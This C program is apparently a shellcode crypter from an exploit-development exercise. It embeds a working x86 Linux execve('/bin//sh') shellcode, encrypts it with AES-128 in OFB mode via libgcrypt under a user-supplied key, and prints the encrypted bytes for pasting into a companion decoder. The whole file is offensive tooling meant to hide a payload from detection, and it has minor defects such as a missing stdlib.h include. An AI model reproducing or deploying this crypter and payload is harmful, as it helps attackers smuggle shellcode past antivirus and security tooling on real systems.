#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <gcrypt.h>

#define GCRY_CIPHER GCRY_CIPHER_AES128   // Pick the cipher here
#define GCRY_MODE GCRY_CIPHER_MODE_OFB // Pick the cipher mode here

unsigned char shellcode [] = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(int argc, char* argv[])
{ 
    if (argc < 2)
    {
            printf("[!] No key provided.\n");
            printf("usage: %s <KEY>\n", argv[0]);
            return 0;
    }

    gcry_cipher_hd_t handle;

    size_t keyLength = gcry_cipher_get_algo_keylen(GCRY_CIPHER);

    size_t shell_len = strlen(shellcode);
    unsigned char * encBuffer = malloc(shell_len);

    const char * key = argv[1]; // 16 bytes

    gcry_cipher_open(&handle, GCRY_CIPHER, GCRY_MODE, 0);

    gcry_control (GCRYCTL_DISABLE_SECMEM, 0);

    gcry_control (GCRYCTL_INITIALIZATION_FINISHED, 0);

    gcry_cipher_setkey(handle, key, keyLength);

    gcry_cipher_encrypt(handle, encBuffer, shell_len, shellcode, shell_len);

    size_t index;
    printf("\nEncoded shellcode = ");
    for (index = 0; index<shell_len; index++){
        printf("\\x%02x", encBuffer[index]);
    }
    printf("\n\nPaste this code into decoder.c\n\n");

    gcry_cipher_close(handle);
    free(encBuffer);
    return 0;
}
